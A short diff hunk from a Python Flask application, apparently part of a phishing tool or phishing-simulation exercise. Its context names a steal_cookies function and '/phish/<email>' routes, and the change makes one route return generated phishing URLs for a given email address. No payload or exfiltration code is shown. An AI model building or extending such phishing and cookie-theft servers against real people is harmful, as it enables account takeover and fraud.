@@ -151,7 +151,7 @@ def steal_cookies():
 @app.route("/phish/<email>", methods=['GET', 'POST'])
 def phishy(email): 
     if request.method == 'GET': 
-        return redirect(url_for('view_user', email=email))
+        return jsonify(urls=phish.get_phish_urls(email))
 
 @app.route("/phish/<email>/<url>")
 def phish_code(email, url):
